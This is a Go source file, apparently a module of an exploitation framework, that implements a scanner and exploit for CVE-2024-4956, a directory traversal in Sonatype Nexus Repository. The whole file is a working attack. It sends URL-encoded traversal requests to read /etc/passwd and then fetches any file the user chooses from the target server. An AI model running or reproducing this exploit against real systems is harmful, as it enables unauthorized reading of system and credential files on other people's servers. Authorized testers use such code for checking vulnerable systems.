package vul

import (
	"appsploit/pkg/utils"
	appVul "appsploit/pkg/vul"
	"github.com/urfave/cli/v2"
	"strings"
)

type CVE_2024_4956 struct {
	appVul.BaseVulnerability
}

var CVE_2024_4956_v1 = CVE_2024_4956{
	BaseVulnerability: appVul.BaseVulnerability{
		Name:        "CVE-2024-4956",
		Description: "Sonatype Nexus Repository Directory Traversal - Type: Arbitrary File Read",
	},
}

func (cve CVE_2024_4956) CheckSec(ctx *cli.Context) (bool, error) {
	baseURL := utils.Http.FormatURL(ctx)
	if resp, err := utils.Http.Get(baseURL + "/%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"); err != nil {
		return false, err
	} else {
		if strings.Contains(resp, "root:") {
			CVE_2024_4956_v1.VulnerabilityExists = true
			CVE_2024_4956_v1.VulnerabilityResponse = "vulnerability is exists"
		} else {
			CVE_2024_4956_v1.VulnerabilityExists = false
		}
	}
	return CVE_2024_4956_v1.VulnerabilityExists, error(nil)
}

func (cve CVE_2024_4956) Exploit(ctx *cli.Context) (bool, error) {
	baseURL := utils.Http.FormatURL(ctx)
	filename := ctx.String("file")
	if !strings.HasPrefix(filename, "/") {
		filename = "/" + filename
	}
	filename = strings.ReplaceAll(filename, "/","%2f")
	if vulnerabilityExists, err := cve.CheckSec(ctx); err != nil {
		return CVE_2024_4956_v1.VulnerabilityExists, err
	} else {
		if vulnerabilityExists {
			httpClient := *utils.Http.Client()
			if resp, err := httpClient.Get(baseURL + "/%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f.." + filename); err != nil {
				CVE_2024_4956_v1.VulnerabilityExists = false
				return CVE_2024_4956_v1.VulnerabilityExists, err
			} else {
				CVE_2024_4956_v1.VulnerabilityResponse = resp.String()
			}
		}
	}
	return CVE_2024_4956_v1.VulnerabilityExists, error(nil)
}
